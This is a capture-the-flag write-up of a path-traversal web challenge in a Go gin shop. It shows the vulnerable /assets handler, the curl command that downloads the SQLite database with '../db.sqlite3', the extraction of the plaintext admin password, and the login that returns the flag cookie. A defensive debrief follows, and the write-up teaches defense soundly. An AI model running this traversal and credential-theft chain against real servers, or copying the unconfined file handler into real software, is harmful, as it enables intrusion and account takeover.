# viking — path traversal to the admin password

**Category:** web · **Flag:** `flag{1m_th3_fl4g_u_4r3_l00k1ng_f0r}`

A Go (gin) shop. The flag is handed out by the admin area: log in as `admin` at
`POST /admin` and the server sets it as a `FLAG` cookie (and `GET /admin` echoes the
flag when you present that cookie).

```go
e.GET("/admin", func(c *gin.Context) {
    cookie, err := c.Cookie("FLAG")
    if err != nil || subtle.ConstantTimeCompare([]byte(cookie), []byte(flag)) == 0 {
        c.HTML(http.StatusOK, "admin.html", nil)   // not logged in: just the form
        return
    }
    c.String(http.StatusOK, flag)
})
e.POST("/admin", func(c *gin.Context) {
    // ... look up `username`, constant-time compare `password` ...
    c.Writer.Header().Add("Set-Cookie", "FLAG="+flag)   // success: the flag cookie
    c.HTML(http.StatusOK, "success.html", nil)
})
```

Only the `admin` user exists and its password is 32 random bytes, so there is no
brute force and no SQL injection (the query is parameterised). But `/assets` is
vulnerable to path traversal:

```go
e.GET("/assets", func(c *gin.Context) {
    id := c.Query("id")
    path := filepath.Join("assets", filepath.Clean(id))  // not a sanitizer!
    c.File(path)
})
```

`filepath.Clean` is **not** a traversal guard (see golang/go#34938): `filepath.Join`
resolves the `..`, so `id=../db.sqlite3` escapes `assets/` and serves the database.

### Solve

Set `URL=http://$HOST:$PORT`.

1. Download the database through the traversal:

   ```bash
   curl "$URL/assets?id=../db.sqlite3" --output db.sqlite3
   ```

2. Read the admin password out of it:

   ```bash
   sqlite3 db.sqlite3 'select username, password from user;'
   # admin|<64-hex password>
   ```

3. Log in as admin; the response sets the flag cookie:

   ```bash
   curl -i -X POST "$URL/admin" -d 'username=admin&password=<the hex password>'
   # Set-Cookie: FLAG=flag{1m_th3_fl4g_u_4r3_l00k1ng_f0r}
   ```

The flag is the value of that `FLAG` cookie.

**Lesson:** `filepath.Clean` normalises a path but does not confine it to a base
directory — always resolve the final path and check it still lives under the
intended root before serving it.

## Debrief: what you learn and how to protect against it

**What you learn:** path traversal. The server builds a file path from user input,
and `../` walks out of the folder it was meant to stay in. Here that gives you the
whole database file. You also see why passwords must not be stored in clear text:
the stolen database gives a working admin login directly.

**The solve in short:**

1. Find the endpoint that serves files: `/assets?id=...`.
2. Step out of the folder and fetch the database:
   `curl "$URL/assets?id=../db.sqlite3" -o db.sqlite3`.
3. Read the admin password: `sqlite3 db.sqlite3 'select * from user;'`.
4. Log in as admin with it. The flag comes back as the `FLAG` cookie.

**How to protect against it:**

- Avoid building file paths from user input. Let the client send an id and look
  the file up in a list or a table.
- When a path has to come from the user: resolve the final path and check that
  it is still inside the base folder, or use an API that confines it (Go:
  `os.Root`, `http.FileServer(http.Dir(...))`). `filepath.Clean` only tidies the
  path, it does not confine it.
- Keep the database, config and source outside every folder that can be served.
- Hash passwords with a slow algorithm (argon2id, bcrypt) so a leaked database
  does not give working logins.
- Run the service with the fewest file permissions it needs.
